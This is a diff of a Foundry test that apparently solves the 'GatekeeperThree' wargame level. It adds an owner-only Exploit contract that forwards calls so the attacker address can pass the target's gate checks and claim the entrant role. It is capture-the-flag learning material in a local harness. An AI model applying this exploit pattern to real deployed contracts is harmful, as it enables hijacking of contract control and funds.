@@ -9,7 +9,10 @@ contract GatekeeperExploitTest is Test {
     Exploit exp;
     address me = makeAddr("me");
     function setUp() public {
+        vm.deal(address(me), 0.00101 ether);
+
         gate = new GatekeeperThree();
+        vm.prank(address(me));
         exp = new Exploit();
     }
 
@@ -17,23 +20,36 @@ contract GatekeeperExploitTest is Test {
         uint256 password = block.timestamp;
         gate.createTrick();
 
-        vm.prank(address(exp));
-        gate.construct0r();
+        vm.prank(address(me));
+        exp.call(
+            payable(gate),
+            0,
+            abi.encodeWithSelector(gate.construct0r.selector)
+        );
         gate.getAllowance(password);
 
-        address(gate).call{value: 0.00101 ether}("");
-
         vm.prank(address(me));
-        exp.enter(payable(gate));
+        address(gate).call{value: 0.00101 ether}("");
+        vm.prank(address(me));
+        exp.call(payable(gate), 0, abi.encode(gate.enter.selector));
 
-        assertEq(gate.entrant(), DEFAULT_SENDER, "No Entrant claimed");
+        assertEq(gate.entrant(), me, "No Entrant claimed");
     }
 }
 
 contract Exploit {
-    function enter(address payable at) external {
-        GatekeeperThree t = GatekeeperThree(at);
-        t.enter();
+    address owner;
+    constructor() {
+        owner = msg.sender;
+    }
+    function call(
+        address payable to,
+        uint256 value,
+        bytes memory data
+    ) external payable returns (bool, bytes memory) {
+        if (msg.sender != owner) revert("Only Owner");
+
+        return payable(to).call{value: value}(data);
     }
     receive() external payable {
         // assembly {
